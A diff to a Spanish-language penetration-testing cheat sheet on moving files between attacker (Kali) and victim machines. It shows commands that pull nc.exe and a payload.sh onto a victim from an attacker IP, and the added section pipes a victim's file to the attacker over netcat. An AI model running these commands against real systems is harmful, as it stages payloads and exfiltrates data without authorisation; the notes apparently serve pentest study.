@@ -59,7 +59,7 @@ EXTRA:
    # Servidor HTTP con PHP → alternativa a Python
 ```
 
-### Víctima Windows — Descargar desde Linux
+### Víctima Windows — Descargar (Subir) a Windows 
 
 ```bash
 1  ❯ powershell -c "Invoke-WebRequest http://<IP>/nc.exe -OutFile nc.exe"
@@ -121,7 +121,7 @@ EXTRA:
 	# IP = Es la IP de la máquina víctima 
 ```
 
-### Víctima Linux — Descargar desde Kali
+### Víctima Linux — Descargar (Subir) a Linux
 
 ```bash
 1. ❯ wget http://<IP>/payload.sh
@@ -186,6 +186,22 @@ EXTRA:
 
 4. ❯ nc -nlvp 443 > archivo_recibido.exe
    # Recibir via netcat → en Windows usar nc.exe < archivo.exe
+```
+
+---
+
+## LINUX (VÍCTIMA) → LINUX (ATACANTE)
+
+### Víctima Linux — Enviar a Kali
+
+```bash 
+1. ❯ cat /ruta/al/archivo | nc IP_Kali 4444
+```
+
+### Atacante Kali — Recibir desde Linux víctima
+
+```bash 
+1. ❯ nc -lvnp 4444 > archivo_descargado
 ```
 
 ---
